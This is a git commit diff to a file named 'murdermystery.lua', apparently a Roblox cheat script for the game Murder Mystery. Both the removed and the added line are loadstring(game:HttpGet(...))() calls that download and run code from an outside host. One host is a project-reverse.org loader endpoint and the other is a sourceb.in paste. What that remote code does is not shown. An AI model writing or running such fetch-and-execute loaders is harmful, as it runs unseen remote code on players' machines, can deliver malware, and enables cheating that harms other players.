38768576f6c48f5a77a2e87ad029682f6183026f
xvzwhy <whosbuddyfr@gmail.com>
2026-07-12 11:24:38 -0400

    murdermystery.lua

--- murdermystery.lua
+++ murdermystery.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImM2OWVlNjM3LTQyMmMtNDdmMy1iYjhiLWNjN2E5MTAwNzNhNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/PPqs55Qxs4/0"))()
